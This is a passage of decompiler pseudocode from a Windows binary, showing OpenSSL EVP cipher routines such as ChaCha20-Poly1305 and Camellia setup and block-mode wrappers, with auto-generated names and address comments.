// 5339E0: using guessed type _DWORD dword_5339E0;

//----- (0045C680) --------------------------------------------------------
int sub_45C680()
{
  if ( !sub_407E50(dword_533A00) )
  {
    sub_407CD0(0, &dword_533A00);
    sub_407CD0(0, &dword_533A60);
  }
  return 1;
}
// 533A00: using guessed type int dword_533A00;
// 533A60: using guessed type _DWORD dword_533A60;

//----- (0045C6C0) --------------------------------------------------------
int sub_45C6C0()
{
  if ( !sub_407E50(dword_533A80) )
  {
    sub_407CD0(0, &dword_533A80);
    sub_407CD0(0, &dword_533B20);
  }
  return 1;
}
// 533A80: using guessed type int dword_533A80;
// 533B20: using guessed type _DWORD dword_533B20;

//----- (0045C700) --------------------------------------------------------
int sub_45C700()
{
  if ( !sub_407E50(dword_533BA0) )
  {
    sub_407CD0(0, &dword_533BA0);
    sub_407CD0(0, &dword_533EA8);
  }
  return 1;
}
// 533BA0: using guessed type int dword_533BA0;
// 533EA8: using guessed type _DWORD dword_533EA8;

//----- (0045C740) --------------------------------------------------------
int sub_45C740()
{
  if ( !sub_407E50(dword_534220) )
  {
    sub_407CD0(0, &dword_534220);
    sub_407CD0(0, &dword_5343C0);
  }
  return 1;
}
// 534220: using guessed type int dword_534220;
// 5343C0: using guessed type _DWORD dword_5343C0;

//----- (0045C780) --------------------------------------------------------
int sub_45C780()
{
  if ( !sub_407E50(dword_5344D8) )
  {
    sub_407CD0(0, &dword_5344D8);
    sub_407CD0(0, &dword_534590);
  }
  return 1;
}
// 5344D8: using guessed type int dword_5344D8;
// 534590: using guessed type _DWORD dword_534590;

//----- (0045C7C0) --------------------------------------------------------
int sub_45C7C0()
{
  if ( !sub_407E50(dword_5345F0) )
  {
    sub_407CD0(0, &dword_5345F0);
    sub_407CD0(0, &dword_534728);
  }
  return 1;
}
// 5345F0: using guessed type int dword_5345F0;
// 534728: using guessed type _DWORD dword_534728;

//----- (0045C800) --------------------------------------------------------
int sub_45C800()
{
  if ( !sub_407E50(dword_534820) )
  {
    sub_407CD0(0, &dword_534820);
    sub_407CD0(0, &dword_534860);
  }
  return 1;
}
// 534820: using guessed type int dword_534820;
// 534860: using guessed type _DWORD dword_534860;

//----- (0045C840) --------------------------------------------------------
int sub_45C840()
{
  if ( !sub_407E50(dword_534878) )
  {
    sub_407CD0(0, &dword_534878);
    sub_407CD0(0, &stru_539288.RecursionCount);
  }
  return 1;
}
// 534878: using guessed type int dword_534878;

//----- (0045C880) --------------------------------------------------------
int sub_45C880()
{
  if ( !sub_407E50(dword_534898) )
  {
    sub_407CD0(0, &dword_534898);
    sub_407CD0(0, &dword_534AA8);
  }
  return 1;
}
// 534898: using guessed type int dword_534898;
// 534AA8: using guessed type _DWORD dword_534AA8;

//----- (0045C8C0) --------------------------------------------------------
int sub_45C8C0()
{
  if ( !sub_407E50(dword_534C88) )
  {
    sub_407CD0(0, &dword_534C88);
    sub_407CD0(0, &dword_534D28);
  }
  return 1;
}
// 534C88: using guessed type int dword_534C88;
// 534D28: using guessed type _DWORD dword_534D28;

//----- (0045C900) --------------------------------------------------------
int sub_45C900()
{
  if ( !sub_407E50(dword_534D98) )
  {
    sub_407CD0(0, &dword_534D98);
    sub_407CD0(0, &dword_534F50);
  }
  return 1;
}
// 534D98: using guessed type int dword_534D98;
// 534F50: using guessed type _DWORD dword_534F50;

//----- (0045C940) --------------------------------------------------------
int sub_45C940()
{
  if ( !sub_407E50(dword_535150) )
  {
    sub_407CD0(0, &dword_535150);
    sub_407CD0(0, &dword_5352B8);
  }
  return 1;
}
// 535150: using guessed type int dword_535150;
// 5352B8: using guessed type _DWORD dword_5352B8;

//----- (0045C980) --------------------------------------------------------
int __cdecl sub_45C980(int a1, int a2, int a3)
{
  int v3; // edx
  unsigned __int16 *v4; // eax
  int v5; // ecx
  int v6; // esi
  unsigned int v7; // ebx
  unsigned __int16 *v8; // eax
  int v9; // ecx
  int v10; // esi
  unsigned int v11; // ebx
  int result; // eax

  v3 = *(_DWORD *)(a1 + 96);
  if ( a2 )
  {
    v4 = (unsigned __int16 *)(a2 + 2);
    v5 = -2 - a2;
    do
    {
      v6 = *((unsigned __int8 *)v4 - 2) | ((*((unsigned __int8 *)v4 - 1) | (*v4 << 8)) << 8);
      v7 = ((unsigned int)v4 + v5) >> 2;
      v4 += 2;
      *(_DWORD *)(v3 + 4 * v7) = v6;
    }
    while ( (unsigned int)v4 + v5 < 0x20 );
  }
  if ( a3 )
  {
    v8 = (unsigned __int16 *)(a3 + 2);
    v9 = -2 - a3;
    do
    {
      v10 = *((unsigned __int8 *)v8 - 2) | ((*((unsigned __int8 *)v8 - 1) | (*v8 << 8)) << 8);
      v11 = ((unsigned int)v8 + v9) >> 2;
      v8 += 2;
      *(_DWORD *)(v3 + 4 * v11 + 32) = v10;
    }
    while ( (unsigned int)v8 + v9 < 0x10 );
  }
  result = 1;
  *(_DWORD *)(v3 + 112) = 0;
  return result;
}

//----- (0045CA30) --------------------------------------------------------
int __cdecl sub_45CA30(int a1, __m128i *a2, const __m128i *a3, int a4)
{
  int v4; // ebp
  const __m128i *v5; // edi
  unsigned int v6; // eax
  bool v7; // zf
  int v8; // eax
  unsigned int v9; // ebp
  unsigned int v10; // ebx
  unsigned int v11; // esi
  unsigned int v12; // esi
  unsigned __int32 v13; // eax
  __m128i *v14; // ecx
  __int8 v15; // bl
  unsigned __int32 v17; // [esp+10h] [ebp+4h]

  v4 = a4;
  v5 = *(const __m128i **)(a1 + 96);
  v6 = v5[7].m128i_u32[0];
  if ( !v6 )
  {
LABEL_9:
    v8 = v4 & 0x3F;
    v9 = v4 - v8;
    v10 = v5[2].m128i_u32[0];
    v17 = v8;
    if ( v9 >= 0x40 )
    {
      do
      {
        v11 = v9 >> 6;
        v10 += v9 >> 6;
        if ( v10 < v9 >> 6 )
        {
          v11 -= v10;
          v10 = 0;
        }
        v12 = v11 << 6;
        sub_4AC000(a2, a3, v12, v5, v5 + 2);
        a3 = (const __m128i *)((char *)a3 + v12);
        a2 = (__m128i *)((char *)a2 + v12);
        v9 -= v12;
        v5[2].m128i_i32[0] = v10;
        if ( !v10 )
          ++v5[2].m128i_i32[1];
      }
      while ( v9 >= 0x40 );
      v8 = v17;
    }
    if ( v8 )
    {
      memset((void *)&v5[3], 0, 0x40u);
      sub_4AC000((__m128i *)&v5[3], v5 + 3, 0x40u, v5, v5 + 2);
      v13 = 0;
      if ( v17 )
      {
        v14 = a2;
        do
        {
          v15 = v5[3].m128i_i8[v13++] ^ v14->m128i_i8[(char *)a3 - (char *)a2];
          v14->m128i_i8[0] = v15;
          v14 = (__m128i *)((char *)v14 + 1);
        }
        while ( v13 < v17 );
      }
      v5[7].m128i_i32[0] = v17;
    }
    return 1;
  }
  if ( a4 )
  {
    do
    {
      if ( v6 >= 0x40 )
        break;
      a2->m128i_i8[0] = a3->m128i_i8[0] ^ v5[3].m128i_i8[v6++];
      --v4;
      a2 = (__m128i *)((char *)a2 + 1);
      a3 = (const __m128i *)((char *)a3 + 1);
    }
    while ( v4 );
  }
  v5[7].m128i_i32[0] = v6;
  if ( v4 )
  {
    if ( v6 == 64 )
    {
      v7 = v5[2].m128i_i32[0]++ == -1;
      v5[7].m128i_i32[0] = 0;
      if ( v7 )
        ++v5[2].m128i_i32[1];
    }
    goto LABEL_9;
  }
  return 1;
}

//----- (0045CB50) --------------------------------------------------------
void *sub_45CB50()
{
  return &unk_5185A4;
}

//----- (0045CB60) --------------------------------------------------------
int __cdecl sub_45CB60(int a1, int a2, void *Src)
{
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // edx
  int v6; // eax
  char v8; // [esp+Ch] [ebp-14h] BYREF
  int v9; // [esp+Dh] [ebp-13h]
  int v10; // [esp+11h] [ebp-Fh]
  int v11; // [esp+15h] [ebp-Bh]
  __int16 v12; // [esp+19h] [ebp-7h]
  char v13; // [esp+1Bh] [ebp-5h]
  int v14; // [esp+1Ch] [ebp-4h] BYREF

  v3 = *(_DWORD **)(a1 + 96);
  if ( a2 || Src )
  {
    v3[38] = 0;
    v3[39] = 0;
    v3[40] = 0;
    v3[41] = 0;
    v3[42] = 0;
    v3[43] = 0;
    v3[46] = -1;
    if ( Src )
    {
      v8 = 0;
      v9 = 0;
      v10 = 0;
      v11 = 0;
      v12 = 0;
      v13 = 0;
      v4 = v3[45];
      if ( v4 <= 16 )
        memcpy((char *)&v14 - v4, Src, v3[45]);
      sub_45C980(a1, a2, (int)&v8);
      v5 = v3[10];
      v6 = v3[11];
      v3[30] = v3[9];
      v3[31] = v5;
      v3[32] = v6;
    }
    else
    {
      sub_45C980(a1, a2, 0);
    }
  }
  return 1;
}

//----- (0045CC50) --------------------------------------------------------
int __cdecl sub_45CC50(int a1, __m128i *a2, __m128i *Src, int Size)
{
  int v4; // ecx
  __m128i *v5; // ebx
  __m128i *v6; // ebp
  const __m128i *v7; // esi
  size_t v8; // edi
  bool v9; // cf
  int result; // eax
  char *v11; // eax
  char v12[16]; // [esp+18h] [ebp-14h] BYREF

  v4 = a1;
  v5 = a2;
  v6 = Src;
  v7 = *(const __m128i **)(a1 + 96);
  v8 = v7[11].m128i_u32[2];
  if ( !v7[10].m128i_i32[3] )
  {
    v7[2].m128i_i32[0] = 0;
    memset((void *)&v7[3], 0, 0x40u);
    sub_4AC000((__m128i *)&v7[3], v7 + 3, 0x40u, v7, v7 + 2);
    sub_4AD850((const __m128i *)v7[12].m128i_i32, (int)v7[3].m128i_i32);
    v5 = a2;
    v7[2].m128i_i32[0] = 1;
    v7[10].m128i_i32[3] = 1;
    v4 = a1;
    v7[7].m128i_i32[0] = 0;
    v7[10].m128i_i32[0] = 0;
    v7[10].m128i_i32[1] = 0;
    v7[9].m128i_i32[2] = 0;
    v7[9].m128i_i32[3] = 0;
  }
  if ( Src )
  {
    if ( !v5 )
    {
      sub_4AD920(v7[12].m128i_i8, Src->m128i_i8, Size);
      v9 = __CFADD__(Size, v7[9].m128i_i32[2]);
      v7[9].m128i_i32[2] += Size;
      result = Size;
      v7[9].m128i_i32[3] += v9;
      v7[10].m128i_i32[2] = 1;
      return result;
    }
    if ( v7[10].m128i_i32[2] )
    {
      if ( (v7[9].m128i_i32[2] & 0xF) != 0 )
      {
        sub_4AD920(v7[12].m128i_i8, byte_5185D8, 16 - (v7[9].m128i_i32[2] & 0xF));
        v4 = a1;
      }
      v7[10].m128i_i32[2] = 0;
    }
    result = -1;
    v7[11].m128i_i32[2] = -1;
    if ( v8 == -1 )
    {
      v8 = Size;
    }
    else if ( Size != v8 + 16 )
    {
      return result;
    }
    if ( *(_DWORD *)(v4 + 8) )
    {
      sub_45CA30(v4, v5, Src, v8);
      sub_4AD920(v7[12].m128i_i8, v5->m128i_i8, v8);
    }
    else
    {
      sub_4AD920(v7[12].m128i_i8, Src->m128i_i8, v8);
      sub_45CA30(a1, v5, Src, v8);
    }
    v6 = (__m128i *)((char *)Src + v8);
    v5 = (__m128i *)((char *)v5 + v8);
    v7[10].m128i_i64[0] += v8;
    if ( &Src->m128i_i8[v8] )
    {
      if ( v8 == Size )
        return Size;
    }
  }
  if ( v7[10].m128i_i32[2] )
  {
    if ( (v7[9].m128i_i32[2] & 0xF) != 0 )
      sub_4AD920(v7[12].m128i_i8, byte_5185D8, 16 - (v7[9].m128i_i32[2] & 0xF));
    v7[10].m128i_i32[2] = 0;
  }
  if ( (v7[10].m128i_i32[0] & 0xF) != 0 )
    sub_4AD920(v7[12].m128i_i8, byte_5185D8, 16 - (v7[10].m128i_i32[0] & 0xF));
  sub_4AD920(v7[12].m128i_i8, &v7[9].m128i_i8[8], 0x10u);
  v11 = &v7[8].m128i_i8[4];
  if ( !*(_DWORD *)(a1 + 8) )
    v11 = v12;
  sub_4AD9E0((int)v7[12].m128i_i32, (int)v11);
  v7[10].m128i_i32[3] = 0;
  if ( !v6 || Size == v8 )
  {
    if ( *(_DWORD *)(a1 + 8) || !sub_413A50(v12, &v7[8].m128i_i8[4], v7[11].m128i_i32[0]) )
      return Size;
    return -1;
  }
  if ( !*(_DWORD *)(a1 + 8) )
  {
    if ( !sub_413A50(v12, v6, 16) )
      return Size;
    memset(v5, 0, v8);
    return -1;
  }
  v5->m128i_i32[0] = v7[8].m128i_i32[1];
  v5->m128i_i32[1] = v7[8].m128i_i32[2];
  v5->m128i_i32[2] = v7[8].m128i_i32[3];
  v5->m128i_i32[3] = v7[9].m128i_i32[0];
  return Size;
}

//----- (0045CF50) --------------------------------------------------------
int __cdecl sub_45CF50(int a1)
{
  int v1; // eax

  if ( *(_DWORD *)(a1 + 96) )
  {
    v1 = sub_4AD840();
    sub_4139E0(*(_BYTE **)(a1 + 96), v1 + 140);
  }
  return 1;
}

//----- (0045CF80) --------------------------------------------------------
int __cdecl sub_45CF80(int a1, int a2, size_t Size, __m128i *Src)
{
  _DWORD *v4; // esi
  int v5; // eax
  int result; // eax
  int v7; // eax
  void *v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // ecx
  __m128i *v13; // eax
  int v14; // eax
  int v15[2]; // [esp+10h] [ebp-14h] BYREF
  __int16 v16; // [esp+18h] [ebp-Ch]
  unsigned __int8 v17; // [esp+1Ah] [ebp-Ah]
  char v18; // [esp+1Bh] [ebp-9h]
  char v19; // [esp+1Ch] [ebp-8h]

  v4 = *(_DWORD **)(a1 + 96);
  switch ( a2 )
  {
    case 0:
      if ( !v4 )
      {
        v5 = sub_4AD840();
        v4 = sub_413430(v5 + 192);
        *(_DWORD *)(a1 + 96) = v4;
        if ( !v4 )
        {
          sub_408310(6, 182, 134, (int)"crypto\\evp\\e_chacha20_poly1305.c", 334);
          goto LABEL_5;
        }
      }
      v4[38] = 0;
      v4[39] = 0;
      v4[40] = 0;
      v4[41] = 0;
      v4[42] = 0;
      v4[43] = 0;
      v4[44] = 0;
      v4[45] = 12;
      v4[46] = -1;
      goto LABEL_7;
    case 8:
      if ( !v4 )
        goto LABEL_7;
      v7 = sub_4AD840();
      v8 = sub_424800(v4, v7 + 192);
      Src[6].m128i_i32[0] = (__int32)v8;
      if ( v8 )
        goto LABEL_7;
      sub_408310(6, 182, 173, (int)"crypto\\evp\\e_chacha20_poly1305.c", 353);
LABEL_5:
      result = 0;
      break;
    case 9:
      if ( Size - 1 > 0xF )
        goto LABEL_5;
      v4[45] = Size;
      result = 1;
      break;
    case 16:
      if ( Size - 1 > 0xF || !*(_DWORD *)(a1 + 8) )
        goto LABEL_5;
      memcpy(Src, v4 + 33, Size);
      result = 1;
      break;
    case 17:
      if ( Size - 1 > 0xF )
        goto LABEL_5;
      if ( Src )
      {
        memcpy(v4 + 33, Src, Size);
        v4[44] = Size;
      }
      result = 1;
      break;
    case 18:
      if ( Size != 12 )
        goto LABEL_5;
      v9 = Src->m128i_u8[0] | ((Src->m128i_u8[1] | (Src->m128i_u16[1] << 8)) << 8);
      v4[9] = v9;
      v4[30] = v9;
      v10 = Src->m128i_u8[4] | ((Src->m128i_u8[5] | (Src->m128i_u16[3] << 8)) << 8);
      v4[10] = v10;
      v4[31] = v10;
      v11 = Src->m128i_u8[8] | ((Src->m128i_u8[9] | (Src->m128i_u16[5] << 8)) << 8);
      v4[11] = v11;
      v4[32] = v11;
      result = 1;
      break;
    case 22:
      if ( Size != 13 )
        goto LABEL_5;
      v12 = Src->m128i_u8[12] | (Src->m128i_u8[11] << 8);
      v13 = Src;
      if ( !*(_DWORD *)(a1 + 8) )
      {
        v14 = Src->m128i_i32[0];
        v15[1] = Src->m128i_i32[1];
        v12 -= 16;
        v17 = Src->m128i_u8[10];
        v15[0] = v14;
        v16 = Src->m128i_i16[4];
        v13 = (__m128i *)v15;
        v18 = BYTE1(v12);
        v19 = v12;
      }
      v4[46] = v12;
      v4[9] = v4[30];
      v4[10] = v4[31] ^ (v13->m128i_u8[0] | ((v13->m128i_u8[1] | (v13->m128i_u16[1] << 8)) << 8));
      v4[11] = v4[32] ^ (v13->m128i_u8[4] | ((v13->m128i_u8[5] | (v13->m128i_u16[3] << 8)) << 8));
      v4[43] = 0;
      sub_45CC50(a1, 0, v13, 13);
      result = 16;
      break;
    case 23:
LABEL_7:
      result = 1;
      break;
    default:
      result = -1;
      break;
  }
  return result;
}

//----- (0045D330) --------------------------------------------------------
void *sub_45D330()
{
  return &unk_535360;
}

//----- (0045D340) --------------------------------------------------------
int __cdecl sub_45D340(int a1, unsigned int *a2, int a3, int a4)
{
  int *v4; // esi
  int v5; // eax
  int result; // eax
  FILE *v7; // eax
  int v8; // eax
  BOOL v9; // ecx
  BOOL v10; // edx

  v4 = (int *)sub_4073F0(a1);
  v5 = sub_407470(a1);
  if ( sub_4AEC60(a2, 8 * v5, v4) >= 0 )
  {
    v7 = (FILE *)sub_435D30(a1);
    v8 = _fileno(v7) & 0xF0007;
    if ( (v8 == 1 || v8 == 2) && !a4 )
    {
      v9 = v8 != 2;
      v4[70] = (int)sub_4ADF50;
      result = 1;
      v4[71] = v9 ? 0 : (unsigned int)sub_4AFD00;
    }
    else
    {
      v10 = v8 != 2;
      v4[70] = (int)sub_4ADB20;
      result = 1;
      v4[71] = v10 ? 0 : (unsigned int)sub_4AFD00;
    }
  }
  else
  {
    sub_408310(6, 159, 157, (int)"crypto\\evp\\e_camellia.c", 221);
    return 0;
  }
  return result;
}
// 4ADB20: using guessed type int sub_4ADB20();
// 4ADF50: using guessed type int sub_4ADF50();
// 4AFD00: using guessed type _DWORD __cdecl sub_4AFD00(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0045D410) --------------------------------------------------------
int __cdecl sub_45D410(int C, char *a2, char *a3, int a4)
{
  int v4; // esi
  int v5; // eax
  _DWORD *v7; // eax
  char *v8; // eax
  int v9; // [esp-4h] [ebp-Ch]
  void (__cdecl *v10)(char *, char *, int); // [esp-4h] [ebp-Ch]
  void (__cdecl *v11)(char *, int *, int); // [esp-4h] [ebp-Ch]

  v4 = sub_4073F0(C);
  if ( *(_DWORD *)(v4 + 284) )
  {
    v9 = sub_432B60(C);
    v5 = _tolower(C);
    (*(void (__cdecl **)(char *, char *, int, int, int, int))(v4 + 284))(a3, a2, a4, v4, v5, v9);
    return 1;
  }
  else
  {
    if ( sub_432B60(C) )
    {
      v10 = *(void (__cdecl **)(char *, char *, int))(v4 + 280);
      v7 = (_DWORD *)_tolower(C);
      sub_4126B0(a3, a2, a4, v4, v7, v10);
    }
    else
    {
      v11 = *(void (__cdecl **)(char *, int *, int))(v4 + 280);
      v8 = (char *)_tolower(C);
      sub_412850(a3, a2, a4, v4, v8, v11);
    }
    return 1;
  }
}

//----- (0045D4D0) --------------------------------------------------------
int __cdecl sub_45D4D0(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // edi
  int v5; // ebp
  int v6; // esi
  unsigned int v7; // ebx
  int i; // eax
  unsigned int v10; // [esp+20h] [ebp+10h]

  v4 = sub_4073D0(a1);
  v5 = sub_4073F0(a1);
  if ( a4 >= v4 )
  {
    v6 = a3;
    v10 = a4 - v4;
    v7 = 0;
    for ( i = a2 - a3; ; i = a2 - a3 )
    {
      (*(void (__cdecl **)(int, int, int))(v5 + 280))(v6, v6 + i, v5);
      v7 += v4;
      v6 += v4;
      if ( v7 > v10 )
        break;
    }
  }
  return 1;
}

//----- (0045D540) --------------------------------------------------------
int __cdecl sub_45D540(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int (__cdecl *v7)(int, int, int); // [esp-4h] [ebp-10h]
  int v8; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  v8 = sub_407450(C);
  v7 = *(int (__cdecl **)(int, int, int))(v4 + 280);
  v5 = _tolower(C);
  sub_412AF0(a3, a2, a4, v4, v5, (unsigned int *)&v8, v7);
  sub_407460(C, v8);
  return 1;
}

//----- (0045D5B0) --------------------------------------------------------
int __cdecl sub_45D5B0(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int v7; // [esp-8h] [ebp-14h]
  void (__cdecl *v8)(int, int, int); // [esp-4h] [ebp-10h]
  int v9; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  v9 = sub_407450(C);
  v8 = *(void (__cdecl **)(int, int, int))(v4 + 280);
  v7 = sub_432B60(C);
  v5 = _tolower(C);
  sub_412C00(a3, a2, a4, v4, v5, (unsigned int *)&v9, v7, v8);
  sub_407460(C, v9);
  return 1;
}

//----- (0045D630) --------------------------------------------------------
int __cdecl sub_45D630(int C, int a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int *v5; // eax
  int v7; // [esp-8h] [ebp-14h]
  void (__cdecl *v8)(int *, int *, int); // [esp-4h] [ebp-10h]
  int v9; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  v9 = sub_407450(C);
  v8 = *(void (__cdecl **)(int *, int *, int))(v4 + 280);
  v7 = sub_432B60(C);
  v5 = (int *)_tolower(C);
  sub_4130A0(a3, a2, a4, v4, v5, (int)&v9, v7, v8);
  sub_407460(C, v9);
  return 1;
}

//----- (0045D6B0) --------------------------------------------------------
int __cdecl sub_45D6B0(int C, int a2, int a3, unsigned int a4)
{
  int v4; // edi
  int *v5; // eax
  unsigned int v7; // ebx
  unsigned int v8; // ebp
  int *v9; // eax
  int v10; // eax
  int *v11; // eax
  int v12; // [esp-10h] [ebp-1Ch]
  void (__cdecl *v13)(int *, int *, int); // [esp-Ch] [ebp-18h]
  int v14; // [esp-Ch] [ebp-18h]
  int v15; // [esp-8h] [ebp-14h]
  void (__cdecl *v16)(int *, int *, int); // [esp-8h] [ebp-14h]
  void (__cdecl *v17)(int *, int *, int); // [esp-4h] [ebp-10h]
  int v18; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_4073F0(C);
  if ( sub_4075D0(C, 0x2000) )
  {
    v18 = sub_407450(C);
    v17 = *(void (__cdecl **)(int *, int *, int))(v4 + 280);
    v15 = sub_432B60(C);
    v5 = (int *)_tolower(C);
    sub_413000(a3, a2, a4, v4, v5, (int)&v18, v15, v17);
    sub_407460(C, v18);
    return 1;
  }
  else
  {
    v7 = a4;
    if ( a4 >= 0x10000000 )
    {
      v8 = a4 >> 28;
      do
      {
        v18 = sub_407450(C);
        v13 = *(void (__cdecl **)(int *, int *, int))(v4 + 280);
        v12 = sub_432B60(C);
        v9 = (int *)_tolower(C);
        sub_413000(a3, a2, 0x80000000, v4, v9, (int)&v18, v12, v13);
        v7 -= 0x10000000;
        sub_407460(C, v18);
        --v8;
      }
      while ( v8 );
    }
    if ( v7 )
    {
      v10 = sub_407450(C);
      v16 = *(void (__cdecl **)(int *, int *, int))(v4 + 280);
      v18 = v10;
      v14 = sub_432B60(C);
      v11 = (int *)_tolower(C);
      sub_413000(a3, a2, 8 * v7, v4, v11, (int)&v18, v14, v16);
      sub_407460(C, v18);
    }
    return 1;
  }
}

//----- (0045D810) --------------------------------------------------------
int __cdecl sub_45D810(int C, _BYTE *a2, _BYTE *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax
  _DWORD *v8; // [esp-Ch] [ebp-18h]
  _DWORD *v9; // [esp-Ch] [ebp-18h]
  void (__cdecl *v10)(_DWORD *, _DWORD *, unsigned int, int, int); // [esp-4h] [ebp-10h]
  void (__cdecl *v11)(int, _DWORD *, int); // [esp-4h] [ebp-10h]
  int v12; // [esp+8h] [ebp-4h] BYREF

  v12 = sub_407450(C);
  v4 = sub_4073F0(C);
  if ( *(_DWORD *)(v4 + 284) )
  {
    v10 = *(void (__cdecl **)(_DWORD *, _DWORD *, unsigned int, int, int))(v4 + 284);
    v8 = (_DWORD *)sub_407440(C);
    v5 = _tolower(C);
    sub_413270(a3, a2, a4, v4, v5, v8, &v12, v10);
  }
  else
  {
    v11 = *(void (__cdecl **)(int, _DWORD *, int))(v4 + 280);
    v9 = (_DWORD *)sub_407440(C);
    v6 = _tolower(C);
    sub_413120(a3, a2, a4, v4, v6, v9, &v12, v11);
  }
  sub_407460(C, v12);
  return 1;
}

//----- (0045D8C0) --------------------------------------------------------
void *sub_45D8C0()
{
  return &unk_51860C;
}

//----- (0045D8D0) --------------------------------------------------------
void *sub_45D8D0()
{
  return &unk_518640;
}

//----- (0045D8E0) --------------------------------------------------------
void *sub_45D8E0()
{
  return &unk_518674;
}

//----- (0045D8F0) --------------------------------------------------------
void *sub_45D8F0()
{
  return &unk_5186A8;
}

//----- (0045D900) --------------------------------------------------------
void *sub_45D900()
{
  return &unk_5186DC;
}

//----- (0045D910) --------------------------------------------------------
void *sub_45D910()
{
  return &unk_518710;
}

//----- (0045D920) --------------------------------------------------------
void *sub_45D920()
{
  return &unk_518744;
}

//----- (0045D930) --------------------------------------------------------
void *sub_45D930()
{
  return &unk_518778;
}

//----- (0045D940) --------------------------------------------------------
void *sub_45D940()
{
  return &unk_5187AC;
}

//----- (0045D950) --------------------------------------------------------
void *sub_45D950()
{
  return &unk_5187E0;
}

//----- (0045D960) --------------------------------------------------------
void *sub_45D960()
{
  return &unk_518814;
}

//----- (0045D970) --------------------------------------------------------
void *sub_45D970()
{
  return &unk_518848;
}

//----- (0045D980) --------------------------------------------------------
void *sub_45D980()
{
  return &unk_51887C;
}

//----- (0045D990) --------------------------------------------------------
void *sub_45D990()
{
  return &unk_5188B0;
}

//----- (0045D9A0) --------------------------------------------------------
void *sub_45D9A0()
{
  return &unk_5188E4;
}

//----- (0045D9B0) --------------------------------------------------------
void *sub_45D9B0()
{
  return &unk_518918;
}

//----- (0045D9C0) --------------------------------------------------------
void *sub_45D9C0()
{
  return &unk_51894C;
}

//----- (0045D9D0) --------------------------------------------------------
void *sub_45D9D0()
{
  return &unk_518980;
}

//----- (0045D9E0) --------------------------------------------------------
void *sub_45D9E0()
{
  return &unk_5189B4;
}

//----- (0045D9F0) --------------------------------------------------------
void *sub_45D9F0()
{
  return &unk_5189E8;
}

//----- (0045DA00) --------------------------------------------------------
void *sub_45DA00()
{
  return &unk_518A1C;
}

//----- (0045DA10) --------------------------------------------------------
int __cdecl sub_45DA10(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4)
{
  unsigned int v5; // ebp
  int v7; // eax
  int v8; // eax
  int v10; // [esp-8h] [ebp-18h]
  int v11; // [esp-8h] [ebp-18h]
  int v12; // [esp-4h] [ebp-14h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      v12 = sub_432B60(C);
      v10 = _tolower(C);
      v7 = sub_4073F0(C);
      sub_4B0A10(a3, a2, 0x40000000u, v7, v10, v12);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    v13 = sub_432B60(C);
    v11 = _tolower(C);
    v8 = sub_4073F0(C);
    sub_4B0A10(a3, a2, v5, v8, v11, v13);
  }
  return 1;
}

//----- (0045DAC0) --------------------------------------------------------
int __cdecl sub_45DAC0(int C, _BYTE *a2, char *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned int v5; // esi
  int v7; // eax
  int v9; // [esp-14h] [ebp-1Ch]
  int v10; // [esp-Ch] [ebp-14h]

  v4 = a4;
  v5 = 0x40000000;
  if ( a4 < 0x40000000 )
    v5 = a4;
  if ( a4 )
  {
    do
    {
      if ( v4 < v5 )
        break;
      a4 = sub_407450(C);
      v10 = sub_432B60(C);
      v9 = _tolower(C);
      v7 = sub_4073F0(C);
      sub_4B0F00(a3, a2, v4, v7, v9, (int *)&a4, v10);
      sub_407460(C, a4);
      a2 += v5;
      v4 -= v5;
      a3 += v5;
      if ( v4 < v5 )
        v5 = v4;
    }
    while ( v4 );
  }
  return 1;
}

//----- (0045DB50) --------------------------------------------------------
int __cdecl sub_45DB50(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // edi
  int v5; // esi
  unsigned int v6; // ebx
  int v7; // eax
  int v9; // [esp-10h] [ebp-14h]
  unsigned int v10; // [esp+14h] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v10 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v9 = sub_432B60(a1);
      v7 = sub_4073F0(a1);
      sub_4B1100(v5, (_BYTE *)(v5 + a2 - a3), v7, v9);
      v6 += v4;
      v5 += v4;
    }
    while ( v6 <= v10 );
  }
  return 1;
}

//----- (0045DBC0) --------------------------------------------------------
int __cdecl sub_45DBC0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  int v5; // ebp
  int v7; // eax
  int v8; // eax
  unsigned __int8 *v10; // [esp-8h] [ebp-1Ch]
  unsigned __int8 *v11; // [esp-8h] [ebp-1Ch]
  unsigned int v12; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v12 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v10 = (unsigned __int8 *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B11D0(a3, a2, 0x40000000, v7, v10, (int *)&a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v12;
    }
    while ( v12 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v11 = (unsigned __int8 *)_tolower(C);
    v8 = sub_4073F0(C);
    sub_4B11D0(a3, a2, v5, v8, v11, (int *)&a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045DCA0) --------------------------------------------------------
const char *sub_45DCA0()
{
  return "l";
}

//----- (0045DCB0) --------------------------------------------------------
void *sub_45DCB0()
{
  return &unk_518A9C;
}

//----- (0045DCC0) --------------------------------------------------------
